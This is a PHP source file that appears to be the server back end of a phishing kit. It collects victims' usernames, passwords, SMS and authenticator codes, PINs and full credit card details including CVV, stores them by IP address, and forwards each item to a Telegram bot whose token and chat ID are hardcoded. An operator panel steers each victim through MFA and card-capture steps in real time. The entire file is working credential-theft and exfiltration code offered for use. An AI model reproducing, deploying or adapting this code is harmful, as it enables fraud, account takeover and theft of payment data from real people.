<?php
// --- CONFIGURATION ---
$botToken = "6466056286:AAHcttKPkXlPbeaQwUf3_R3MU1vLhiKFzB4"; 
$chatId   = "-5494879778";   
$dbFile   = 'status.json';

$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

function sendTelegram($msg) {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot6466056286:AAHcttKPkXlPbeaQwUf3_R3MU1vLhiKFzB4/sendMessage?chat_id=-5494879778&parse_mode=HTML&text=" . urlencode($msg);
    @file_get_contents($url);
}

// ========== HANDLE PANEL ACTIONS (GET REQUESTS) ==========
if (isset($_GET['action']) && isset($_GET['ip'])) {
    $action = $_GET['action'];
    $targetIp = $_GET['ip'];

    $db = json_decode(@file_get_contents($dbFile), true) ?: [];

    $allowedActions = ['go_sms', 'go_email', 'go_mfa', 'go_card', 'go_approve', 'go_pin', 'otp_error', 'finished', 'push_approved', 'push_error', 'show_error', 'go_done'];

    if (in_array($action, $allowedActions) && isset($db[$targetIp])) {
        $db[$targetIp]['status'] = $action;
        file_put_contents($dbFile, json_encode($db));

        sendTelegram("<b>🎮 [PANEL ACTION]</b>
────────────────
<b>IP:</b> <code>$targetIp</code>
<b>ACTION:</b> <code>$action</code>");
    }

    header("Location: panel.php?view=" . urlencode($targetIp));
    exit;
}

// ========== NORMAL POST HANDLING ==========
if (isset($_POST['type'])) {
    $type = $_POST['type'];

    $db = json_decode(@file_get_contents($dbFile), true) ?: [];
    if (!isset($db[$ip])) {
        $db[$ip] = ['status' => 'online', 'last_seen' => time(), 'last_code' => '', 'email' => '', 'ua' => $_SERVER['HTTP_USER_AGENT']];
    }
    $db[$ip]['last_seen'] = time();

    // 1. TYPING START
    if ($type == 'typing_start') {
        $step = $_POST['step'] ?? 'Unknown';
        $db[$ip]['status'] = "Typing $step";
        $msg = "<b>🔍 [LIVE TRACKING]</b>
────────────────
<b>IP:</b> <code>$ip</code>
<b>STATUS:</b> ✍️ Typing...
<b>STEP:</b> <code>$step</code>";
        sendTelegram($msg);
    }

    // 2. USERNAME ENTERED
    if ($type == 'login_username') {
        $user = $_POST['user'] ?? 'N/A';
        $db[$ip]['email'] = $user;
        $db[$ip]['status'] = 'username_entered';
        $msg = "<b>👤 [USERNAME ENTERED]</b>
────────────────
<b>USER:</b> <code>$user</code>
<b>IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // 3. LOGIN SUBMITTED
    if ($type == 'login' || $type == 'login_email') {
        $user = $_POST['user'] ?? $_POST['email'] ?? 'N/A';
        $pass = $_POST['password'] ?? '';
        $db[$ip]['email'] = $user;
        if ($pass) $db[$ip]['password'] = $pass;
        $db[$ip]['status'] = 'login_submitted';
        $msg = "<b>🔐 [LOGIN SUBMITTED]</b>
────────────────
<b>USER:</b> <code>$user</code>
<b>PASS:</b> <code>$pass</code>
<b>IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // 4. SMS REQUEST
    if ($type == 'sms_request') {
        $phone = $_POST['phone'] ?? 'N/A';
        $email = $_POST['email'] ?? '';
        if ($email) $db[$ip]['email'] = $email;
        $db[$ip]['phone'] = $phone;
        $db[$ip]['status'] = 'sms_requested';
        $msg = "<b>📱 [SMS REQUEST]</b>
────────────────
<b>Phone:</b> <code>$phone</code>
<b>IP:</b> <code>$ip</code>";
        if ($email) $msg .= "
<b>Email:</b> <code>$email</code>";
        sendTelegram($msg);
    }

    // 5. RESEND SMS
    if ($type == 'resend_sms') {
        $email = $_POST['email'] ?? '';
        $db[$ip]['status'] = 'sms_resend';
        $msg = "<b>🔄 [SMS RESEND REQUEST]</b>
────────────────
<b>IP:</b> <code>$ip</code>";
        if ($email) $msg .= "
<b>Email:</b> <code>$email</code>";
        sendTelegram($msg);
    }

    // 6. OTP CODE RECEIVED
    if (strpos($type, '2fa_') !== false) {
        $code = $_POST['code'] ?? '------';
        $email = $_POST['email'] ?? '';
        $label = strtoupper(str_replace('2fa_', '', $type));

        if ($email) $db[$ip]['email'] = $email;
        $db[$ip]['last_code'] = $code;
        $db[$ip]['status'] = "code_$label";

        $msg = "<b>🔢 [CODE RECEIVED: $label]</b>
────────────────
<b>CODE:</b> <pre>$code</pre>
<b>IP:</b> <code>$ip</code>";
        if ($email) $msg .= "
<b>Email:</b> <code>$email</code>";
        sendTelegram($msg);
    }

    // 6b. PIN CODE RECEIVED
    if ($type == 'pin') {
        $pin = $_POST['pin'] ?? '------';
        $email = $_POST['email'] ?? '';

        if ($email) $db[$ip]['email'] = $email;
        $db[$ip]['pin'] = $pin;
        $db[$ip]['last_code'] = $pin;
        $db[$ip]['status'] = "pin_received";

        $msg = "<b>🔢 [PIN CODE RECEIVED]</b>
────────────────
<b>PIN:</b> <pre>$pin</pre>
<b>IP:</b> <code>$ip</code>";
        if ($email) $msg .= "
<b>Email:</b> <code>$email</code>";
        sendTelegram($msg);
    }

    // 7. CREDIT CARD DATA
    if ($type == 'card' || $type == 'card_info') {
        $cardNumber = $_POST['card_number'] ?? '';
        $expiry     = $_POST['expiry'] ?? '';
        $cvv        = $_POST['cvv'] ?? '';
        $cardName   = $_POST['card_name'] ?? '';

        $db[$ip]['card_data'] = [
            'number' => $cardNumber,
            'expiry' => $expiry,
            'cvv'    => $cvv,
            'name'   => $cardName
        ];
        $db[$ip]['status'] = 'card_collected';

        $msg = "<b>💳 [CREDIT CARD]</b>
────────────────
<b>Card:</b> <code>$cardNumber</code>
<b>Exp:</b> <code>$expiry</code>
<b>CVV:</b> <code>$cvv</code>
<b>Holder:</b> <code>$cardName</code>
<b>IP:</b> <code>$ip</code>";
        sendTelegram($msg);
    }

    // 8. PUSH NOTIFICATION REQUEST
    if ($type == 'push_request') {
        $db[$ip]['status'] = 'push_waiting';
        sendTelegram("<b>📲 [PUSH REQUEST]</b>
────────────────
<b>IP:</b> <code>$ip</code>
Waiting for admin approval...");
    }

    // 9. PUSH APPROVED
    if ($type == 'push_approved') {
        $email = $_POST['email'] ?? '';
        if ($email) $db[$ip]['email'] = $email;
        $db[$ip]['status'] = 'push_approved';
        sendTelegram("<b>✅ [PUSH APPROVED]</b>
────────────────
<b>IP:</b> <code>$ip</code>
User approved push notification.");
    }

    // Save database
    file_put_contents($dbFile, json_encode($db));
}

echo "OK";
?>